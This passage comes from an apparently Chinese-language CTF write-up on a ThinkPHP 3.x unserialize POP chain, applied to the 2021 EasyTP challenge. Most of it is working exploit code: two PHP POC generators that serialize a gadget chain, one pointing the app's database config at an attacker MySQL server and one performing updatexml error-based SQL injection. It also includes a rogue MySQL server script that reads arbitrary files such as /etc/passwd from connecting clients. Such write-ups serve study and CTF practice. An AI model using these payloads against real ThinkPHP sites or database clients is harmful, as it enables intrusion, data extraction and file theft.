                        $this->lastInsID = $this->_linkID->lastInsertId();
                    }
                    return $this->numRows;
                }
            }catch (\PDOException $e) {
                $this->error();
                return false;
            }
        }
可以发现这个方法大致写的就是先通过$this->config里面的值去初始化数据库连接，然后在这基础上执行前面传入的sql语句
我们跟进一下`$this->initConnect(true);`
接着又跟进`$this->connect()`
到这里链子就已经结束了，总结一下
### 总结
> **链子** ：
>
> `/ThinkPHP/Library/Think/Image/Driver/Imagick.class.php`:: `__destruct()` =>
>
> `/ThinkPHP/Library/Think/Session/Driver/Memcache.class.php` :: `destroy()`
> =>
>
> `/ThinkPHP/Library/Think/Model.class.php` :: `delete()` =>
>
> `/ThinkPHP/Library/Think/Db/Driver.class.php` :: `delete()`
>
> **漏洞利用**
>
>
> 在驱动类中的execute方法中我们可以通过修改config成员变量，使得我们能够自由连接数据库，也就是说，我们可以连接恶意数据库从而达到一些目的，比如说[
> **MySQL恶意服务端读取客户端文件漏洞**](https://cloud.tencent.com/developer/article/1818089)
## POC脚本：
     true    // 开启才能读取文件
            );
            protected $config = array(
                "debug"    => 1,
                "database" => "thinkphp",
                "hostname" => "127.0.0.1",
                "hostport" => "3307",
                "charset"  => "utf8",
                "username" => "root",
                "password" => ""
            );
        }
    }
    namespace Think\Image\Driver{
        use Think\Session\Driver\Memcache;
        class Imagick{
            private $img;
            public function __construct(){
                $this->img = new Memcache();
            }
        }
    }
    namespace Think\Session\Driver{
        use Think\Model;
        class Memcache{
            protected $handle;
            public function __construct(){
                $this->handle = new Model();
            }
        }
    }
    namespace Think{
        use Think\Db\Driver\Mysql;
        class Model{
            protected $options   = array();
            protected $pk;
            protected $data = array();
            protected $db = null;
            public function __construct(){
                $this->db = new Mysql();
                $this->options['where'] = '';
                $this->pk = 'id';
                $this->data[$this->pk] = array(
                    "table" => "mysql.user where 1=updatexml(1,user(),1)#",
                    "where" => "1=1"
                );
            }
        }
    }
    namespace {
        echo base64_encode(serialize(new Think\Image\Driver\Imagick()));
    }
    //此为搬运poc
## 例题：
### [红明谷CTF 2021]EasyTP
提示为tp框架，访问www.zip拿到源码
在默认控制器下发现有反序列化点，直接post传参就行
现在我们可以利用上面那个poc读取文件，先试试读取/etc/passwd
成功读到文件，然后试着读取数据库的配置
本来是想着读取他的配置文件，看有没有数据库密码之内的，很显然我没找到，但我感觉预期就是通过读文件来找mysql数据库密码泄露，然后进行sql注入。
后来我去看了一眼WP发现这个比赛时的数据库密码原来是弱口令123456，BUU上复现的也是弱口令root，那这就好办了，直接sql注入
报错注入的过程就不做具体叙述了
     true    // 开启才能读取文件
            );
            protected $config = array(
                "debug"    => 1,
                "database" => "mysql",
                "hostname" => "127.0.0.1",
                "hostport" => "3306",
                "charset"  => "utf8",
                "username" => "root",
                "password" => "root"
            );
        }
    }
    namespace Think\Image\Driver{
        use Think\Session\Driver\Memcache;
        class Imagick{
            private $img;
            public function __construct(){
                $this->img = new Memcache();
            }
        }
    }
    namespace Think\Session\Driver{
        use Think\Model;
        class Memcache{
            protected $handle;
            public function __construct(){
                $this->handle = new Model();
            }
        }
    }
    namespace Think{
        use Think\Db\Driver\Mysql;
        class Model{
            protected $options   = array();
            protected $pk;
            protected $data = array();
            protected $db = null;
            public function __construct(){
                $this->db = new Mysql();
                $this->options['where'] = '';
                $this->pk = 'id';
                $this->data[$this->pk] = array(
                    "table" => "mysql.user where 1=updatexml(1,concat(0x7e,substr((select group_concat(flag) from test.flag),1,32)),0)#",
                    "where" => "1=1"
                );
            }
        }
    }
    namespace {
        echo base64_encode(serialize(new Think\Image\Driver\Imagick()));
    }
poc如上
这里再给出一个mysql恶意读文件的php脚本
     ";
      $newFilename = rtrim(fgets(STDIN), "\r\n");
      if (!empty($newFilename)) {
        $filename = $newFilename;
      }
      echo "[.] Waiting for connection on 0.0.0.0:3306\n";
      $s = stream_socket_accept($srv, -1, $peer);
      echo "[+] Connection from $peer - greet... ";
      fwrite($s, unhex('45 00 00 00 0a 35 2e 31  2e 36 33 2d 30 75 62 75
                        6e 74 75 30 2e 31 30 2e  30 34 2e 31 00 26 00 00
                        00 7a 42 7a 60 51 56 3b  64 00 ff f7 08 02 00 00
                        00 00 00 00 00 00 00 00  00 00 00 00 64 4c 2f 44
                        47 77 43 2a 43 56 63 72  00                     '));
      fread($s, 8192);
      echo "auth ok... ";
      fwrite($s, unhex('07 00 00 02 00 00 00 02  00 00 00'));
      fread($s, 8192);
      echo "some shit ok... ";
      fwrite($s, unhex('07 00 00 01 00 00 00 00  00 00 00'));
      fread($s, 8192);
      echo "want file... ";
      fwrite($s, chr(strlen($filename) + 1) . "\x00\x00\x01\xFB" . $filename);
      stream_socket_shutdown($s, STREAM_SHUT_WR);
      echo "\n";
      echo "[+] $filename from $peer:\n";
      $len = fread($s, 4);
      if(!empty($len)) {
        list (, $len) = unpack("V", $len);
        $len &= 0xffffff;
        while ($len > 0) {
          $chunk = fread($s, $len);
          $len -= strlen($chunk);
          echo $chunk;
        }
      }
      echo "\n\n";
      fclose($s);
    }
* * *
## 文章参考